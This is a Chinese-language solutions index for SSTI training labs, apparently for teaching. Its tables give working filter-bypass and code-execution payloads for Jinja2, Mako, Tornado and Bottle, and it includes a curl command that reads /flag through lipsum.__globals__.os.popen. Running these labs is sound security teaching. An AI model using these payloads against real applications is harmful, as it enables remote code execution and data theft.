# 题解索引（Solutions Index）

> 这是**索引与速查**，不是完整题解。每个靶场的完整题解（关卡表、逐关 payload、
> 已实测输出）都在它自己的 `README.md` 里，容器内也以 `/docs/README.md` 提供。
>
> 本文只做两件事：**① 指路**；**② 给出「哪条 payload 破哪条规则」的横向速查**。
>
> 可信度：标 ✅ 的 payload 在本文档对应镜像上经 `POST /api/render`（`mode=god`）
> 实际执行过；标「未验证」的是方向而非结论。
> 详细验证记录见各靶场 README 与 `scripts/verify_labs.py`。

---

## 1. 靶场 → 题解

| 靶场 | 题解 | 一句话 |
|------|------|--------|
| 01-jinja-waf-fenjing | [`labs/01-jinja-waf-fenjing/README.md`](../labs/01-jinja-waf-fenjing/README.md) | 关键词表 WAF；Fenjing 工具路线 + `~` 拼接手搓路线，均 ✅ |
| 02-jinja-chain | [`labs/02-jinja-chain/README.md`](../labs/02-jinja-chain/README.md) | Jinja2 13 关链；**id 0–11 已实测可解**，仅 id 12 为作者挑战关（见 [`SOLVABILITY.md`](SOLVABILITY.md)） |
| 03-mako-chain | [`labs/03-mako-chain/README.md`](../labs/03-mako-chain/README.md) | Mako 13 关；**13/13 全部实测可解**（`min(dict(kw))` + `str(bytes(…),'utf8')` 通道） |
| 04-tornado-chain | [`labs/04-tornado-chain/README.md`](../labs/04-tornado-chain/README.md) | Tornado 13 关；**13/13 全部实测可解**（id 1 已从设计缺陷改为拦 `open`） |
| 05-jinja-sandbox | [`labs/05-jinja-sandbox/README.md`](../labs/05-jinja-sandbox/README.md) | 沙箱逃逸 4 关；CVE-2025-27516 原语，已实测（Jinja2==3.1.5） |
| 06-blind-ssti | [`labs/06-blind-ssti/README.md`](../labs/06-blind-ssti/README.md) | 盲注与侧信道 4 关；布尔/时间/写文件回显，已实测 |
| 07-flask-memshell | [`labs/07-flask-memshell/README.md`](../labs/07-flask-memshell/README.md) | 不出网 Flask 内存马；5 个台阶，路由型 + Filter 型均 ✅ |
| 08-freemarker-memshell | [`labs/08-freemarker-memshell/README.md`](../labs/08-freemarker-memshell/README.md)（由另一位作者维护） | 不出网 Java/Tomcat 内存马；Java payload 细节以该 README 为准 |
| 09-bottle-chain | [`labs/09-bottle-chain/README.md`](../labs/09-bottle-chain/README.md) | Bottle SimpleTemplate 13 关链；**13/13 全部实测可解** |
| —— 原理 —— | [`KNOWLEDGE.md`](KNOWLEDGE.md) | 引擎指纹、通用利用模型、gadget 目录、盲注、沙箱、不出网 |
| —— 内存马 —— | [`MEMSHELL.md`](MEMSHELL.md) | 内存马原理 + 两个已验证 payload 的逐行解释 |

---

## 2. 横向速查：哪条 payload 破哪条规则

### 2.1 定界符类规则

| 规则 | 被拦的载荷 | 破解 payload | 验证 |
|------|-----------|--------------|------|
| Jinja 禁 `{{` | `{{7*7}}` | `{% print(7*7) %}` | ✅ lab 02 id1 |
| Bottle 禁 `{{` | `{{7*7}}` | `<% _printlist((str(7*7),),) %>` / `% _stdout.append(str(7*7))` —— 代码块里模板输出原语就是回显通道（`%>` 后必须换行） | ✅ lab 09 id1 |
| Tornado 禁 `{{` 且要**回显** | `{{ open('/flag').read() }}` | —— Tornado 只有 `{{ }}` 一种输出构造，该规则等于拿掉回显通道 | ✅ **已修复**：lab 04 id1 改为拦子串 `open`，见 [`SOLVABILITY.md`](SOLVABILITY.md) §2.1 |
| Mako 禁 `${` | `${7*7}` | `<% context.write(7*7) %>`、`<%context.write(open('/flag').read())%>` | ✅ lab 03 id1 |
| Mako 禁 `${` + 组合过滤（id10） | 上述两者 | —— `<% %>` 里仍有引号/加号限制 | ⚠️ 未验证 |

### 2.2 字符黑名单类规则

| 被禁字符 | 语义受损 | 替代语法 | 验证 |
|----------|----------|----------|------|
| `[` `]` | 下标 / 切片 | 直接读全文；Jinja 用 `\|first` / `\|list`；Tornado/Mako 用 `list()` | ✅ lab 03 id3、lab 04 id3 |
| `'` `"` | 字符串字面量 | `chr(47)+chr(102)+...`（Mako/Tornado）；`request.args.x`（Jinja） | ✅ lab 03 id4、lab 04 id4 |
| `_` | 魔术属性名 | 不用带下划线的链：`open(chr(...)).read()`、`{% import subprocess %}` | ✅ lab 03 id5、lab 04 id5 |
| `.` | 属性访问语法糖 | `getattr(obj,'name')`（Mako/Tornado）；`\|attr`（Jinja）；`[]`（Jinja） | ✅ lab 03 id6、lab 04 id6 |
| `+` | 字符串/整数拼接 | `\|join`（Jinja）、`''.join()`、相邻字面量隐式拼接 | 部分验证（lab 01 隐式拼接 ✅） |
| `0-9` | 数字字面量 | `True` / `len('')` / `bytes()`；或换一条不含数字的链 | ✅ lab 03 id8、lab 04 id8、lab 09 id8 |
| `' " + . [ ]`（组合） | 字符串构造全面受限 | **`min(dict(kw=…))` 取键名** + **`str(bytes((…)),编码)` 造串** —— 两条通道合起来可以在无引号/无加号/无点号下造出任意字符串 | ✅ lab 03 id10、lab 04 id10、lab 09 id10 |
| 再加 `_` 与数字（强字符集） | `chr(95)` 与键名 `__globals__` 都写不出 | `True` 参与算术凑 `chr(47)`；文件名从 `dict(flag=True)` 的键名白嫖；`os.sep` 就是 `/` | ✅ lab 02 id11（`request.args` 传参）、lab 03 id11、lab 04 id11、lab 09 id11 |
| `\` | 转义 | 通常不需要 | — |

### 2.3 子串黑名单类规则（12 词表）

lab 02/03/04 的 L8 与 L13 共用同一张表：
`class` `arg` `form` `value` `data` `request` `init` `global` `open` `mro` `base` `attr`
（L13 另加 `config` `app` `self`）。

| 被拦的写法 | 为什么被拦 | 绕过写法 | 验证 |
|-----------|-----------|----------|------|
| `open(...)` | 子串 `open` | Mako/Tornado 改 `__import__('subprocess').getoutput(...)`；Jinja 走 `__builtins__['op'~'en']` | ✅ lab 01、lab 03 id7、lab 04 id7 |
| `getattr(...)` | 子串 `attr` | Jinja `\|attr('get')('o'~'s')`；`obj['name']` | ✅ lab 01 |
| `handler.get_argument` | 子串 `arg` | 改用 `{{ handler }}` 其他的成员，或 `{% import %}` | ✅ lab 04 id7（实测 WAF） |
| `request` | 子串 `request` | 用 `session` / `config` / `g` / `url_for` 等其它上下文通道 | ✅ lab 03 id10、lab 04 id10 |
| `__globals__` | 子串 `global` | 拼字符串：`'_'~'_'~'globals'~'_'~'_'` | ✅ lab 01 |
| `__class__` | 子串 `__`（或 `class`） | `'_'~'_'~'class'~'_'~'_'` | ✅ lab 01（WAF 边界）、lab 02 思路 |
| `__init__` | 子串 `init` / `__` | 同上拼接；或换 `escape` / `lipsum` 这类不用 `__init__` 的起点 | ✅ lab 04 id12 |
| `subprocess.check_output` | 子串 `_`（L12 起） | 换 `getoutput`（无下划线） | ✅ lab 04 id7 |
| `cat` / `flag`（lab 01 专有） | 各是一个词 | `'ca'~'t'`、`'/fla'~'g'`、`'galf/ tac'[::-1]` | ✅ lab 01 |

### 2.4 前缀拼接 / 变量置空类规则

| 规则 | 观测量 | 绕过 | 验证 |
|------|--------|------|------|
| `{% set config=None%}{% set self=None%}`（Jinja/Tornado） | `template_after_waf` 里能看到前缀 | 换入口：`lipsum` / `cycler` / `escape` / `datetime` | ✅ lab 02 id9、lab 04 id9 |
| `% if False:\n% endif\n`（Mako） | 同上 | 前缀是合法行语法，照常写载荷 | ✅ lab 03 id9 |
| `<% config = None %>`（Bottle） | 同上 | `config` 变量没了，`open` / `__import__` 内置函数不受影响 | ✅ lab 09 id9 |

### 2.5 回显方式（不是「规则」，但决定打法）

| `echo_mode` | 你看到的 | 打法 | 验证 |
|-------------|----------|------|------|
| `full` | 渲染结果 | 直接读 | ✅ 多数关卡 |
| `bool` | `correct` / `wrong` | 布尔盲注：让条件决定是否抛异常 | ✅ lab 02/03/04/09 id2 |
| `none` | 恒定字符串 | 副作用：写文件 / 注册路由 / 改进程状态 | ✅ lab 07 step2 |
| `file` | 恒定字符串 | 写进可访问目录再 HTTP 取回 | ✅ lab 07 step3（`/echo/`） |

---

## 3. 按知识点找关卡

| 想练什么 | 去哪 |
|----------|------|
| 工具型绕过（不可枚举黑名单） | lab 01（Fenjing `crack-keywords`） |
| 定界符被封后换语法面 | lab 02 id1、lab 03 id1、lab 09 id1、lab 07 step1 |
| 字符串构造（`~` / `chr` / `str(bytes(…),编码)` / 键名白嫖） | lab 01、lab 02 id7–id11、lab 03 id4–id12、lab 04 id4–id12、lab 09 id4–id12 |
| 属性访问的四种等价写法 | lab 02 id5–id7、lab 03 id6、lab 04 id6、lab 09 id6–id7、[`KNOWLEDGE.md` §4.5](KNOWLEDGE.md) |
| 对象图 → `os` / `__builtins__` | lab 01、lab 02 id0–id7、lab 04 id7、lab 09 id7–id8、lab 07 step0 |
| 前缀污染 / 变量置空 | lab 02 id9、lab 03 id9、lab 04 id9、lab 09 id9 |
| 布尔盲注 | lab 02/03/04/09 id2 |
| 完全无回显（连成败都不给） | lab 07 step2 |
| 无回显 + 不出网 → 文件回显 | lab 07 step3 |
| 无回显 + 不出网 → 内存马 | lab 07 step4（Flask）、lab 08（Tomcat） |
| 沙箱逃逸 | lab 05；原理见 [`KNOWLEDGE.md` §7](KNOWLEDGE.md) |
| 引擎指纹 | 各靶场 L1；[`KNOWLEDGE.md` §2](KNOWLEDGE.md) |

---

## 4. 公开硬关清单（当前无短解）

> 📊 **完整的「每关都有解吗」实测矩阵、成因分析与逐条参考解，
> 见 [`SOLVABILITY.md`](SOLVABILITY.md)。** 那一份是用
> `tests/audit_solvability.py` 逐关实打出来的，本节只是摘要。

上一轮审计记录的 9 个「无短解」关卡，本轮已处理完毕：

- **8 关已找到真实解并实测通过**：02 id 11、03 id 10/11/12、04 id 10/11/12；
  新增的 lab 09 的 13 关全部按已验证解设计。两条通用通道见
  [`SOLVABILITY.md`](SOLVABILITY.md) §2.3：
  `min(dict(kw=…))` 取键名 + `str(bytes((…)),编码)` 造串；代码块 `from x import y`。
- **04 id 1 是设计缺陷，已直接修复**（拦 `{{` → 拦子串 `open`）。
- **仅剩 02 id 12（L13 扩展关键字）**：`attr` 在子串表内 ⇒ Jinja 全部属性访问
  原语（`|attr` / `getattr` / `map(attribute=…)`）写不出来，加上点号与方括号被禁，
  已知 gadget 链全部依赖至少一次属性访问 —— 保留为作者挑战关，题面已如实标注。
  教学场次需要人人可过时，按 [`SOLVABILITY.md`](SOLVABILITY.md) §2.5 的表
  放宽一条约束即可。

改动过滤后请同步改：`shared/ssti_core/levels/<engine>.py`、该靶场 `README.md` 的关卡表、
`scripts/verify_labs.py` 的探针，并重跑 `tests/audit_solvability.py` 确认新的矩阵。

---

## 5. 复现一条 payload 的最短命令

```bash
# 1) 起靶场（先建前端镜像）
scripts/build-frontend.sh
cd labs/02-jinja-chain && docker compose up --build -d

# 2) god 模式下打一发
curl -s -X POST localhost:8092/api/render \
  -H 'Content-Type: application/json' \
  -d '{"level":"0","mode":"god","template":"{{lipsum.__globals__.os.popen(\"cat /flag\").read()}}"}' | jq
```

载荷里引号多、含 `$`、含 `%` 时，**写进 JSON 文件再 `--data-binary @payload.json`**
可以彻底躲开 shell 转义问题：

```json
{"level":"0","mode":"god","template":"{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')['read']()}}"}
```

一键回归：`python scripts/verify_labs.py`（起临时容器，逐靶场断言）。
